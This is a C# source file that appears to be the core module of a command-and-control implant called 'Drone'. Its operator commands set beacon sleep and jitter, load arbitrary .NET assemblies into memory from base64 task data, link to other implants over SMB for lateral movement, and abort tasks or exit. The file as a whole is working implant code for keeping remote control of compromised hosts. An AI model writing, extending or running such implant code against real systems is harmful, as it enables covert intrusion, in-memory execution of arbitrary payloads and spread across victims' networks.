using System;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;
using Drone.Handlers;
using Drone.Models;

namespace Drone.Modules
{
    public class CoreModule : DroneModule
    {
        public override string Name => "core";

        public override List<Command> Commands => new List<Command>
        {
            new("sleep", "Set sleep interval and jitter", SetSleep, new List<Command.Argument>
            {
                new("interval", false),
                new("jitter")
            }),
            new("load-module", "Load an external Drone module", LoadModule, new List<Command.Argument>
            {
                new("/path/to/module.dll", false, true)
            }),
            new("abort", "Abort a running task", AbortTask, new List<Command.Argument>
            {
                new("task-guid", false)
            }),
            new("link", "Link to an SMB Drone", LinkSmbDrone, new List<Command.Argument>
            {
               new("hostname", false) 
            }),
            new("exit", "Exit this Drone", ExitDrone)
        };

        private void SetSleep(DroneTask task, CancellationToken token)
        {
            Config.SetConfig("SleepInterval", Convert.ToInt32(task.Arguments[0]));
            
            if (task.Arguments.Length > 1)
                Config.SetConfig("SleepJitter", Convert.ToInt32(task.Arguments[1]));
        }

        private void LoadModule(DroneTask task, CancellationToken token)
        {
            var bytes = Convert.FromBase64String(task.Artefact);
            var asm = Assembly.Load(bytes);
            
            Drone.LoadDroneModule(asm);
        }

        private void AbortTask(DroneTask task, CancellationToken token)
        {
            Drone.AbortTask(task.Arguments[0]);
        }

        private void LinkSmbDrone(DroneTask task, CancellationToken token)
        {
            var target = task.Arguments[0];
            var handler = new DefaultSmbHandler(target);
            
            Drone.AddChildDrone(handler);
        }

        private void ExitDrone(DroneTask task, CancellationToken token)
        {
            Drone.Stop();
        }
    }
}